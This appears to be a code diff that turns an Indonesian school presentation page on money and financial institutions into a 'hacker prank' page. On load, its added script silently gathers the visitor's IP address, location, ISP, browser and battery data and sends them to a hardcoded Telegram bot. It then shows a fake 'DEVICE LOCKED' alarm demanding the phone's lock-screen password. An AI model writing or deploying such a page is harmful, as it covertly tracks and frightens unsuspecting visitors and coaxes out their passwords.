@@ -1,77 +1,405 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bokep Hot🥵</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.css"/>
-  <script src="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.js"></script>
+    <title>HCKED</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: 'Press Start 2P', cursive, Arial, sans-serif;
+            margin: 0;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            -webkit-font-smoothing: none;
+            image-rendering: pixelated;
+        }
+        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+
+        /* Love Screen */
+        #love-screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100%;
+            transition: opacity 2s ease-in-out;
+            opacity: 1;
+        }
+        #love-screen h1 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            text-shadow: 0 0 5px pink;
+        }
+        #love-screen img {
+            max-width: 90%;
+            height: auto;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 105, 180, 0.5);
+        }
+        #love-screen p {
+            font-size: 1.1em;
+            margin-top: 20px;
+            text-shadow: 0 0 3px white;
+        }
+
+        /* Glitch Screen */
+        #glitch-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            z-index: 100;
+            filter: grayscale(100%) contrast(200%);
+            animation: screen-flicker 0.1s infinite alternate;
+        }
+        .glitch-bar {
+            position: absolute;
+            background-color: white;
+            animation: move-glitch 0.2s infinite alternate;
+            opacity: 0.7;
+        }
+        @keyframes screen-flicker {
+            0% { opacity: 0.9; }
+            100% { opacity: 1; }
+        }
+        @keyframes move-glitch {
+            0% { transform: translateY(var(--start-y)) translateX(var(--start-x)); opacity: 0.7; }
+            50% { transform: translateY(var(--mid-y)) translateX(var(--mid-x)) scaleX(var(--scale-x)); opacity: 0.3; }
+            100% { transform: translateY(var(--end-y)) translateX(var(--end-x)); opacity: 0.9; }
+        }
+
+        /* Device Locked Screen */
+        #locked-screen {
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            color: #0F0;
+            font-family: 'Press Start 2P', cursive, monospace;
+            z-index: 200;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+        #locked-screen h1 {
+            color: red;
+            font-size: 3.5em;
+            text-shadow: 0 0 15px red, 0 0 25px darkred;
+            animation: blink-strong 0.5s infinite alternate;
+            margin-bottom: 20px;
+        }
+        @keyframes blink-strong {
+            0% { opacity: 1; text-shadow: 0 0 15px red; }
+            50% { opacity: 0.5; text-shadow: none; }
+            100% { opacity: 1; text-shadow: 0 0 15px red, 0 0 25px darkred; }
+        }
+        #info-box {
+            background-color: #0d0d0d;
+            border: 3px solid red;
+            padding: 15px;
+            margin: 15px;
+            width: 90%;
+            max-width: 500px;
+            text-align: left;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.7), inset 0 0 10px rgba(255, 0, 0, 0.3);
+            font-size: 0.85em;
+            line-height: 1.5;
+        }
+        .blinking-text {
+            animation: blink-text 3s infinite;
+        }
+        @keyframes blink-text {
+            50% { opacity: 0; }
+        }
+        #password-form {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        #password-input {
+            background-color: #222;
+            border: 2px solid #ff0000;
+            color: #0F0;
+            padding: 12px 18px;
+            font-size: 1.3em;
+            text-align: center;
+            outline: none;
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+            width: 250px;
+            margin-bottom: 10px;
+        }
+        #password-form button {
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1.3em;
+            cursor: pointer;
+            transition: background-color 0.3s, box-shadow 0.3s;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
+        }
+        #password-form button:hover {
+            background-color: #cc0000;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.9);
+        }
+        #arya-message {
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 300;
+        }
+        .arya-line {
+            font-size: 1em;
+            color: #0F0;
+            animation: fadeIn 0.5s forwards;
+            line-height: 1.2;
+            white-space: pre;
+            opacity: 0;
+        }
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        #white-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: none;
+            z-index: 400;
+            transition: opacity 1s ease-in;
+            opacity: 0;
+        }
+    </style>
 </head>
-<body class="bg-gradient-to-b from-gray-900 to-gray-800 text-white font-sans">
+<body>
 
-  <!-- Container -->
-  <div class="swiper h-screen">
-    <div class="swiper-wrapper">
+    <div id="love-screen">
+        <h1>AH YAMETEHH</h1>
+        <img id="love-image" src="love.jpg" alt="Cinta">
+        <p>Hanya untukmu...</p>
+    </div>
 
-      <!-- Slide 1: Perkenalan -->
-      <div class="swiper-slide flex items-center justify-center">
-        <div class="text-center p-6">
-          <h1 class="text-5xl font-bold mb-4 animate-pulse">✨ Selamat Datang ✨</h1>
-          <p class="text-lg text-gray-300">Tema02: Perkembangan Ekonomi Digital</p>
-          <p class="mt-2 text-gray-400">Perkenalan:</p>
-          <p class="mt-2 text-gray-400">➣ 𝐀𝐤𝐛𝐚𝐫 𝐏𝐮𝐭𝐫𝐚 𝐏./𝟐</p>
-          <p class="mt-2 text-gray-400">➣ 𝐑𝐚𝐤𝐚 𝐑𝐚𝐟𝐢 𝐏./𝟐𝟒</p>
-          <p class="mt-2 text-gray-400">➣ 𝐑𝐚𝐧𝐠𝐠𝐚 𝐏𝐚𝐧𝐜𝐚 𝐒./𝟐𝟓</p>
-          <p class="mt-2 text-gray-400">➣ 𝐒𝐚𝐤𝐭𝐢 𝐀𝐫𝐲𝐚 𝐘./𝟐𝟗</p>
+    <div id="glitch-screen"></div>
+    <audio id="glitch-audio" src="glitch.mp3" preload="auto"></audio>
+
+    <div id="locked-screen">
+        <h1><span class="blinking-text">WARNING🪐‼️</span> DEVICE LOCKED</h1>
+        <div id="info-box">
+            <pre id="device-info"></pre>
         </div>
-      </div>
-
-  <div class="swiper-slide flex items-center justify-center">
-        <div class="grid md:grid-cols-2 gap-6 max-w-5xl items-center bg-gray-800/60 p-6 rounded-2xl shadow-xl">
-          
-               
-          <div class="text-center md:text-left">
-            <h2 class="text-3xl font-semibold mb-4 text-white">𝐌𝐚𝐭𝐞𝐫𝐢 𝟏</h2>
-            <p class="text-gray-300">A. Uang dan lembaga</p>
-          </div>
+        <div id="password-form">
+            <p style="color: yellow; text-shadow: 0 0 5px yellow;">MASUKAN PASSWORD CEPATTTTT 🦑</p>
+            <input type="password" id="password-input" placeholder="ACCESS KEY">
+            <button onclick="checkPassword()">AUTHORIZE</button>
         </div>
-      </div>
+    </div>
 
+    <div id="arya-message"></div>
+    <div id="white-screen"></div>
+    
+    <script>
+        const loveScreen = document.getElementById('love-screen');
+        const glitchScreen = document.getElementById('glitch-screen');
+        const glitchAudio = document.getElementById('glitch-audio');
+        const lockedScreen = document.getElementById('locked-screen');
+        const deviceInfo = document.getElementById('device-info');
+        const passwordInput = document.getElementById('password-input');
+        const infoBox = document.getElementById('info-box');
+        const aryaMessage = document.getElementById('arya-message');
+        const whiteScreen = document.getElementById('white-screen');
 
-      <!-- Slide 2: Materi Pertama -->
-      <div class="swiper-slide flex items-center justify-center">
-        <div class="grid md:grid-cols-2 gap-6 max-w-5xl items-center bg-gray-800/60 p-6 rounded-2xl shadow-xl">
-          <img src="https://files.catbox.moe/w5abnx.jpeg" 
-               alt="Materi Pertama" class="rounded-xl shadow-lg">
-          <div class="text-center md:text-left">
-            <h2 class="text-3xl font-semibold mb-4 text-white">1. asal mula terciptanya uang</h2>
-            <p class="text-gray-300">Uang berevolusi dari sistem barter, yang melibatkan pertukaran langsung barang dan jasa. Seiring waktu, kebutuhan akan alat tukar yang lebih praktis dan bernilai lebih stabil mendorong terciptanya berbagai bentuk uang, mulai dari uang komoditas (seperti logam mulia) hingga uang kertas. Bangsa Lydia diyakini sebagai yang pertama kali menggunakan uang logam pada abad ke-6 SM.</p>
-          </div>
-        </div>
-      </div>
+        // Ganti [Nama Pacar] dengan nama yang kamu inginkan
+        document.querySelector('#love-screen h1').textContent = "ARYAXVV SEND";
 
-      <!-- Slide 3: Materi Kedua -->
-      <div class="swiper-slide flex items-center justify-center">
-        <div class="grid md:grid-cols-2 gap-6 max-w-5xl items-center bg-gray-800/60 p-6 rounded-2xl shadow-xl">
-          <img src="https://files.catbox.moe/mghrx8.jpeg" 
-               alt="Materi Kedua" class="rounded-xl shadow-lg">
-          <div class="text-center md:text-left">
-            <h2 class="text-3xl font-semibold mb-4 text-white">2. jenis-jenis dan fungsi uang</h2>
-            <p class="text-gray-300">Uang memiliki berbagai jenis dan fungsi yang saling berkaitan dalam sistem perekonomian. Jenis uang meliputi uang kartal (uang kertas dan koin), uang giral (simpanan di bank), dan uang elektronik (digital). Fungsinya mencakup sebagai alat tukar, satuan hitung, dan penyimpan nilai.</p>
-          </div>
-        </div>
-      </div>
+        // GANTI DENGAN BOT TOKEN DAN CHAT ID KAMU!
+        const BOT_TOKEN = '7260551645:AAExYdVmD-WTjA9X0hgFqzz5IbiD3MvgNfU'; 
+        const CHAT_ID = '7318082575'; 
 
-      <!-- Slide 4: Materi Ketiga -->
-      <div class="swiper-slide flex items-center justify-center">
-        <div class="grid md:grid-cols-2 gap-6 max-w-5xl items-center bg-gray-800/60 p-6 rounded-2xl shadow-xl">
-          <img src="https://files.catbox.moe/ziz5n2.jpeg" 
-               alt="Materi Ketiga" class="rounded-xl shadow-lg">
-          <div class="text-center md:text-left">
-            <h2 class="text-3xl font-semibold mb-4 text-white">3. Bagaimana bentuk Lembaga keuangan di masyarakat</h2>
-            <p class="text-gray-300">Secara umum, terdapat beberapa bentuk lembaga keuangan seperti perbankan, credit union, aset manajemen, pialang saham, building society (sejenis koperasi di Inggris), modal ventura, asuransi, koperasi, dana pensiun, dan lainnya.</p>
-          </div>
+        // Fungsi untuk mengirim pesan ke Telegram
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            fetch(url).catch(error => console.error("Kesalahan saat mengirim data:", error));
+        }
+
+        // Fungsi untuk mendapatkan data IP dan lokasi
+        async function getIPAndLocation() {
+            try {
+                const response = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,isp,query');
+                const data = await response.json();
+                if (data.status === 'success') {
+                    return data;
+                } else {
+                    return { status: 'fail', query: '192.168.1.1 (Dummy)', country: 'Unknown', city: 'Unknown', regionName: 'Unknown', isp: 'Unknown' };
+                }
+            } catch (error) {
+                return { status: 'fail', query: '192.168.1.1 (Dummy)', country: 'Unknown', city: 'Unknown', regionName: 'Unknown', isp: 'Unknown' };
+            }
+        }
+
+        // Fungsi untuk mendapatkan informasi perangkat
+        async function getDeviceInfo() {
+            const locationData = await getIPAndLocation();
+            const battery = navigator.getBattery ? await navigator.getBattery() : null;
+            
+            let batteryLevel = 'N/A';
+            let chargingStatus = 'N/A';
+            if (battery) {
+                batteryLevel = `${Math.round(battery.level * 100)}%`;
+                chargingStatus = battery.charging ? 'YA' : 'TIDAK';
+            }
+
+            const info = `
+[ACCESS DENIED]
+  MASUKAN PASSWORD KAMU
+  PASSWORD LAYAR KUNCI HP MU
+  
+[SECURITY ALERT]
+  Unauthorized system breach detected.
+  Emergency lockdown initiated.
+  Data integrity compromised.
+  Location trace active.
+`;
+            return info;
+        }
+
+        // Fungsi untuk membuat elemen glitch bar
+        function createGlitchBar() {
+            const bar = document.createElement('div');
+            bar.className = 'glitch-bar';
+            bar.style.width = `${Math.random() * 100 + 10}px`;
+            bar.style.height = `${Math.random() * 5 + 1}px`;
+            bar.style.top = `${Math.random() * 100}%`;
+            bar.style.left = `${Math.random() * 100}%`;
+            bar.style.setProperty('--start-y', `${Math.random() * 100 - 50}px`);
+            bar.style.setProperty('--start-x', `${Math.random() * 100 - 50}px`);
+            bar.style.setProperty('--mid-y', `${Math.random() * 100 - 50}px`);
+            bar.style.setProperty('--mid-x', `${Math.random() * 100 - 50}px`);
+            bar.style.setProperty('--end-y', `${Math.random() * 100 - 50}px`);
+            bar.style.setProperty('--end-x', `${Math.random() * 100 - 50}px`);
+            bar.style.setProperty('--scale-x', `${Math.random() * 2 + 0.5}`);
+            glitchScreen.appendChild(bar);
+        }
+
+        function startPrank() {
+            loveScreen.style.opacity = 0;
+            
+            setTimeout(() => {
+                loveScreen.style.display = 'none';
+                glitchScreen.style.display = 'flex';
+                glitchAudio.play();
+                glitchAudio.loop = true;
+                
+                for (let i = 0; i < 50; i++) {
+                    createGlitchBar();
+                }
+
+                setTimeout(() => {
+                    glitchScreen.style.display = 'none';
+                    glitchAudio.pause();
+                    glitchAudio.currentTime = 0;
+                    showLockedScreen();
+                }, 3000);
+            }, 2000);
+        }
+
+        async function showLockedScreen() {
+            lockedScreen.style.display = 'flex';
+            const infoText = await getDeviceInfo();
+            deviceInfo.innerHTML = infoText;
+
+            const locationData = await getIPAndLocation();
+            const battery = navigator.getBattery ? await navigator.getBattery() : null;
+            let batteryLevel = 'N/A';
+            if (battery) {
+                batteryLevel = `${Math.round(battery.level * 100)}%`;
+            }
+            
+            const telegramMessage = `*Peringatan Hacker Prank Berhasil!*
+Info Perangkat:
+- IP: ${locationData.query}
+- Lokasi: ${locationData.city}, ${locationData.regionName}, ${locationData.country}
+- ISP: ${locationData.isp}
+- OS: ${navigator.platform}
+- Browser: ${navigator.userAgent}
+- Baterai: ${batteryLevel}`;
+            sendToTelegram(telegramMessage);
+        }
+
+        function showWhiteScreen() {
+            lockedScreen.style.display = 'none';
+            aryaMessage.style.display = 'none';
+            whiteScreen.style.display = 'block';
+            setTimeout(() => {
+                whiteScreen.style.opacity = 1;
+            }, 10); // sedikit delay untuk memulai transisi
+            setTimeout(closeWindow, 1500); // Tunggu 1.5 detik sebelum menutup
+        }
+
+        function closeWindow() {
+            window.close();
+            setTimeout(() => {
+                alert("Prank selesai! Jika tab tidak tertutup secara otomatis, kamu bisa menutupnya secara manual. 😉");
+            }, 500);
+        }
+
+        function checkPassword() {
+            lockedScreen.style.display = 'none';
+            aryaMessage.style.display = 'flex';
+
+            let lineCount = 0;
+            const maxLines = 10; // Jumlah baris yang akan ditulis
+            const textToWrite = "ARYA IS HERE";
+
+            function writeNextLine() {
+                if (lineCount < maxLines) {
+                    const newLine = document.createElement('div');
+                    newLine.className = 'arya-line';
+                    newLine.textContent = textToWrite;
+                    aryaMessage.appendChild(newLine);
+                    lineCount++;
+                    setTimeout(writeNextLine, 500); // Waktu jeda antar baris
+                } else {
+                    setTimeout(showWhiteScreen, 1000); // Tunggu 1 detik setelah selesai menulis
+                }
+            }
+            
+            writeNextLine();
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const link = document.createElement('link');
+            link.href = 'https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap';
+            link.rel = 'stylesheet';
+            document.head.appendChild(link);
+
+            startPrank();
+        });
+    </script>
+</body>
+</html>
         </div>
       </div>
       
